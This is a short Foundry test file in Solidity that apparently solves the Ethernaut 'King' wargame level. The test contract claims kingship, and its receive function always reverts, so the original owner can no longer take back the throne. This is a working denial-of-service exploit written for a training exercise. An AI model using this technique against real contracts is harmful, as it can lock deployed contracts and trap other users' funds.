// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_9/King.sol";

contract KingTest is Test {
    King king;
    address alice;

    function setUp() public {
        alice = vm.addr(1);

        vm.startPrank(alice);
        vm.deal(alice, 1 ether);
        king = new King{value: 1 ether}();
        vm.stopPrank();
    }

    function testAttack() public {
        vm.deal(address(this), 2 ether);
        address(king).call{value: 2 ether}("");

        vm.startPrank(alice);
        vm.expectRevert();
        address(king).call{value: 2 ether}("");
    }

    receive() external payable {
        revert();
    }
}
